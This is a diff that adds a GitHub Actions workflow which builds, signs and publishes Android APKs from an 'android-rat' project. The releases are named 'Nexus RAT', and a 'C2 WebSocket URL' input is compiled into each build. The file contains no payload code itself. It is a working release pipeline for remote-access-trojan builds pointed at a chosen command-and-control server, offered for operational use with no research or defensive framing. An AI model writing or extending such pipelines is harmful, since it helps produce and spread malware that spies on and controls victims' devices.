@@ -1,0 +1,336 @@
+name: Release APK
+
+# ── Triggers ──────────────────────────────────────────────────────────────────
+on:
+  push:
+    tags:
+      - 'v[0-9]+.[0-9]+.[0-9]+'
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Version tag  (e.g. v1.2.6)'
+        required: true
+      server_url:
+        description: 'C2 WebSocket URL  (wss://...)'
+        required: false
+      draft:
+        description: 'Create as draft release'
+        required: false
+        default: 'false'
+      signing_mode:
+        description: 'Signing — leave blank to auto-detect from secrets'
+        required: false
+        default: 'auto'
+        type: choice
+        options:
+          - auto       # auto-detect: use provided keystore if secret set, else generate
+          - generate   # always generate a fresh keystore (no secrets needed)
+          - provided   # always use KEYSTORE_BASE64 (fail if secret missing)
+
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    name: Signed Release Build
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+
+    defaults:
+      run:
+        working-directory: android-rat
+
+    env:
+      KEYSTORE_TMP: /tmp/nexus-release.jks
+
+    steps:
+      # ── 1. Checkout ──────────────────────────────────────────────────────────
+      - name: Checkout source
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      # ── 2. Resolve version tag ───────────────────────────────────────────────
+      - name: Resolve version
+        id: ver
+        run: |
+          TAG="${{ github.event.inputs.tag || github.ref_name }}"
+          VER="${TAG#v}"
+          IFS='.' read -r MAJ MIN PAT <<< "$VER"
+          VCODE=$(( (MAJ * 10000) + (MIN * 100) + PAT ))
+          echo "tag=$TAG"     >> "$GITHUB_OUTPUT"
+          echo "version=$VER" >> "$GITHUB_OUTPUT"
+          echo "vcode=$VCODE" >> "$GITHUB_OUTPUT"
+          echo "Version $TAG  →  versionCode $VCODE"
+
+      # ── 3. JDK ──────────────────────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+          cache: gradle
+
+      # ── 4. Gradle wrapper ────────────────────────────────────────────────────
+      - name: Make gradlew executable
+        run: chmod +x ./gradlew
+
+      - name: Validate Gradle wrapper
+        uses: gradle/actions/wrapper-validation@v3
+
+      # ── 5. Gradle cache ──────────────────────────────────────────────────────
+      - name: Cache Gradle packages
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: gradle-${{ runner.os }}-${{ hashFiles('android-rat/**/*.gradle*', 'android-rat/**/gradle-wrapper.properties') }}
+          restore-keys: |
+            gradle-${{ runner.os }}-
+
+      # ══════════════════════════════════════════════════════════════════════════
+      #  SIGNING PREPARATION
+      #  Two paths — auto-detected from secrets unless overridden by input.
+      #
+      #  ┌─ Option A: AUTO-GENERATE ─────────────────────────────────────────┐
+      #  │  No secrets required.                                              │
+      #  │  keytool generates a fresh RSA-4096 PKCS12 keystore on the runner.│
+      #  │  The APK is signed and fully valid for sideloading.               │
+      #  │  (Note: a new certificate is generated each run.)                 │
+      #  └───────────────────────────────────────────────────────────────────┘
+      #
+      #  ┌─ Option B: PROVIDED ──────────────────────────────────────────────┐
+      #  │  Set KEYSTORE_BASE64, KEYSTORE_PASS, KEY_ALIAS, KEY_PASS secrets. │
+      #  │  Same certificate every build — consistent fingerprint.           │
+      #  └───────────────────────────────────────────────────────────────────┘
+      # ══════════════════════════════════════════════════════════════════════════
+
+      - name: Prepare signing keystore
+        id: signing
+        env:
+          # Secrets are empty strings when not set — safe to pass here
+          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASS:   ${{ secrets.KEYSTORE_PASS }}
+          KEY_ALIAS:       ${{ secrets.KEY_ALIAS }}
+          KEY_PASS:        ${{ secrets.KEY_PASS }}
+          INPUT_MODE:      ${{ github.event.inputs.signing_mode || 'auto' }}
+        run: |
+          # ── Resolve effective signing mode ──────────────────────────────────
+          if   [ "$INPUT_MODE" = "generate" ]; then
+            EFFECTIVE_MODE="generate"
+          elif [ "$INPUT_MODE" = "provided" ]; then
+            EFFECTIVE_MODE="provided"
+          elif [ -n "$KEYSTORE_BASE64" ]; then
+            # auto + secret present → use provided
+            EFFECTIVE_MODE="provided"
+          else
+            # auto + no secret → generate
+            EFFECTIVE_MODE="generate"
+          fi
+
+          echo "effective_mode=$EFFECTIVE_MODE" >> "$GITHUB_OUTPUT"
+
+          # ── Option A: Auto-generate ─────────────────────────────────────────
+          if [ "$EFFECTIVE_MODE" = "generate" ]; then
+            echo "::notice::Signing mode: AUTO-GENERATE (no secrets required)"
+
+            AUTO_PASS="NexusSign$(date +%Y%m%d)"
+            AUTO_ALIAS="nexus-auto-key"
+
+            keytool -genkeypair \
+              -alias       "$AUTO_ALIAS" \
+              -keyalg      RSA \
+              -keysize     4096 \
+              -validity    10000 \
+              -dname       "CN=Nexus Build,OU=CI,O=Nexus,L=Unknown,ST=Unknown,C=XX" \
+              -keystore    "$KEYSTORE_TMP" \
+              -storepass   "$AUTO_PASS" \
+              -keypass     "$AUTO_PASS" \
+              -storetype   PKCS12 \
+              -noprompt
+
+            echo "keystore_path=$KEYSTORE_TMP"  >> "$GITHUB_OUTPUT"
+            echo "keystore_pass=$AUTO_PASS"      >> "$GITHUB_OUTPUT"
+            echo "key_alias=$AUTO_ALIAS"         >> "$GITHUB_OUTPUT"
+            echo "key_pass=$AUTO_PASS"           >> "$GITHUB_OUTPUT"
+
+            echo "::notice::Auto keystore generated (PKCS12, RSA-4096, validity 10000 days)"
+
+          # ── Option B: Provided keystore ─────────────────────────────────────
+          elif [ "$EFFECTIVE_MODE" = "provided" ]; then
+            echo "::notice::Signing mode: PROVIDED keystore from secret"
+
+            if [ -z "$KEYSTORE_BASE64" ]; then
+              echo "::error::KEYSTORE_BASE64 secret is not set but signing_mode=provided"
+              exit 1
+            fi
+            if [ -z "$KEYSTORE_PASS" ] || [ -z "$KEY_ALIAS" ] || [ -z "$KEY_PASS" ]; then
+              echo "::error::Missing signing secrets: KEYSTORE_PASS / KEY_ALIAS / KEY_PASS"
+              exit 1
+            fi
+
+            echo "$KEYSTORE_BASE64" | base64 --decode > "$KEYSTORE_TMP"
+
+            # Validate decoded file is a real keystore (JKS or PKCS12 magic bytes)
+            MAGIC=$(xxd -l 4 -p "$KEYSTORE_TMP")
+            if [ "$MAGIC" != "feedfeed" ] && [ "$MAGIC" != "30820" ] && \
+               [[ "$MAGIC" != "3082"* ]] && [ "$MAGIC" != "cececece" ]; then
+              echo "::warning::Keystore magic bytes: $MAGIC — proceeding anyway"
+            fi
+
+            echo "keystore_path=$KEYSTORE_TMP" >> "$GITHUB_OUTPUT"
+            echo "keystore_pass=$KEYSTORE_PASS" >> "$GITHUB_OUTPUT"
+            echo "key_alias=$KEY_ALIAS"         >> "$GITHUB_OUTPUT"
+            echo "key_pass=$KEY_PASS"           >> "$GITHUB_OUTPUT"
+
+            KSIZE=$(du -sh "$KEYSTORE_TMP" | cut -f1)
+            echo "::notice::Provided keystore decoded ($KSIZE)"
+          fi
+
+      # ── 6. Verify SERVER_URL ─────────────────────────────────────────────────
+      - name: Resolve SERVER_URL
+        id: server
+        run: |
+          URL="${{ github.event.inputs.server_url }}"
+          [ -z "$URL" ] && URL="${{ secrets.SERVER_URL }}"
+          [ -z "$URL" ] && URL="wss://localhost:3000"
+          echo "url=$URL" >> "$GITHUB_OUTPUT"
+          echo "SERVER_URL: $URL"
+
+      # ── 7. Build signed release APK ──────────────────────────────────────────
+      - name: Build signed release APK
+        run: |
+          ./gradlew assembleRelease \
+            -PSERVER_URL="${{ steps.server.outputs.url }}" \
+            -PKEYSTORE_PATH="${{ steps.signing.outputs.keystore_path }}" \
+            -PKEYSTORE_PASS="${{ steps.signing.outputs.keystore_pass }}" \
+            -PKEY_ALIAS="${{ steps.signing.outputs.key_alias }}" \
+            -PKEY_PASS="${{ steps.signing.outputs.key_pass }}" \
+            -PVERSION_CODE="${{ steps.ver.outputs.vcode }}" \
+            -PVERSION_NAME="${{ steps.ver.outputs.version }}" \
+            -PSKIP_PARANOID=true \
+            --no-daemon \
+            --stacktrace
+        env:
+          GRADLE_OPTS: "-Xmx4g -XX:+UseG1GC"
+
+      # ── 8. Rename & fingerprint APK ──────────────────────────────────────────
+      - name: Collect APK
+        id: apk
+        run: |
+          SRC=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          [ -z "$SRC" ] && { echo "::error::No APK found"; exit 1; }
+
+          DEST="app/build/outputs/apk/release/nexus-rat-${{ steps.ver.outputs.tag }}.apk"
+          mv "$SRC" "$DEST"
+
+          SIZE=$(du -sh "$DEST" | cut -f1)
+          SHA256=$(sha256sum "$DEST" | awk '{print $1}')
+          MD5=$(md5sum    "$DEST" | awk '{print $1}')
+
+          echo "path=$DEST"     >> "$GITHUB_OUTPUT"
+          echo "size=$SIZE"     >> "$GITHUB_OUTPUT"
+          echo "sha256=$SHA256" >> "$GITHUB_OUTPUT"
+          echo "md5=$MD5"       >> "$GITHUB_OUTPUT"
+
+          echo "APK: $DEST ($SIZE)"
+          echo "SHA-256: $SHA256"
+          echo "MD5:     $MD5"
+
+      # ── 9. Verify APK signature ──────────────────────────────────────────────
+      - name: Verify APK signature
+        run: |
+          APK="$GITHUB_WORKSPACE/android-rat/${{ steps.apk.outputs.path }}"
+          APKSIGNER=$(find "$ANDROID_HOME/build-tools" -name "apksigner" 2>/dev/null | sort -V | tail -1)
+          if [ -n "$APKSIGNER" ]; then
+            "$APKSIGNER" verify --verbose "$APK" \
+              && echo "::notice::APK signature verified (apksigner)"
+          else
+            jarsigner -verify "$APK" \
+              && echo "::notice::APK signature verified (jarsigner)"
+          fi
+
+          # Print certificate fingerprint for traceability
+          APKSIGNER_CHECK=$(find "$ANDROID_HOME/build-tools" -name "apksigner" 2>/dev/null | sort -V | tail -1)
+          if [ -n "$APKSIGNER_CHECK" ]; then
+            "$APKSIGNER_CHECK" verify --print-certs "$APK" 2>/dev/null | grep -E "Signer|SHA|subject" || true
+          fi
+
+      # ── 10. Generate changelog ───────────────────────────────────────────────
+      - name: Generate changelog
+        id: notes
+        run: |
+          cd "$GITHUB_WORKSPACE"
+          PREV=$(git describe --tags --abbrev=0 HEAD^ 2>/dev/null || echo "")
+          if [ -n "$PREV" ]; then
+            LOG=$(git log --pretty="- %s (%h)" "${PREV}..HEAD" -- android-rat/ 2>/dev/null | head -30)
+          else
+            LOG=$(git log --pretty="- %s (%h)" -20 -- android-rat/ 2>/dev/null)
+          fi
+          [ -z "$LOG" ] && LOG="- Release ${{ steps.ver.outputs.tag }}"
+
+          MODE="${{ steps.signing.outputs.effective_mode }}"
+          MODE_BADGE="🔑 Provided keystore"
+          [ "$MODE" = "generate" ] && MODE_BADGE="⚡ Auto-generated keystore"
+
+          cat > /tmp/release_notes.md << EOF
+          ## Nexus RAT ${{ steps.ver.outputs.tag }}
+
+          ### Changes
+          ${LOG}
+
+          ### Build Info
+          | | |
+          |---|---|
+          | Version | \`${{ steps.ver.outputs.tag }}\` |
+          | VersionCode | \`${{ steps.ver.outputs.vcode }}\` |
+          | Signing | ${MODE_BADGE} |
+          | SHA-256 | \`${{ steps.apk.outputs.sha256 }}\` |
+          | MD5 | \`${{ steps.apk.outputs.md5 }}\` |
+          | Size | ${{ steps.apk.outputs.size }} |
+          | Runner | \`${{ runner.os }}\` |
+          | Commit | \`${{ github.sha }}\` |
+          EOF
+
+      # ── 11. Create GitHub Release ────────────────────────────────────────────
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name:  ${{ steps.ver.outputs.tag }}
+          name:      "Nexus RAT ${{ steps.ver.outputs.tag }}"
+          body_path: /tmp/release_notes.md
+          draft:     ${{ github.event.inputs.draft == 'true' }}
+          prerelease: false
+          fail_on_unmatched_files: true
+          files: android-rat/${{ steps.apk.outputs.path }}
+
+      # ── 12. Upload artifact backup ───────────────────────────────────────────
+      - name: Upload signed APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nexus-rat-${{ steps.ver.outputs.tag }}-signed
+          path: android-rat/${{ steps.apk.outputs.path }}
+          retention-days: 30
+          if-no-files-found: error
+
+      # ── 13. Build summary ────────────────────────────────────────────────────
+      - name: Write job summary
+        if: always()
+        run: |
+          echo "## Release Summary" >> "$GITHUB_STEP_SUMMARY"
+          cat /tmp/release_notes.md >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          echo "" >> "$GITHUB_STEP_SUMMARY"
+          echo "**Signing mode:** \`${{ steps.signing.outputs.effective_mode }}\`" >> "$GITHUB_STEP_SUMMARY"
+
+      # ── 14. Cleanup keystore (always runs) ───────────────────────────────────
+      - name: Clean up keystore
+        if: always()
+        run: |
+          rm -f "$KEYSTORE_TMP"
+          echo "Keystore removed from runner"
+          
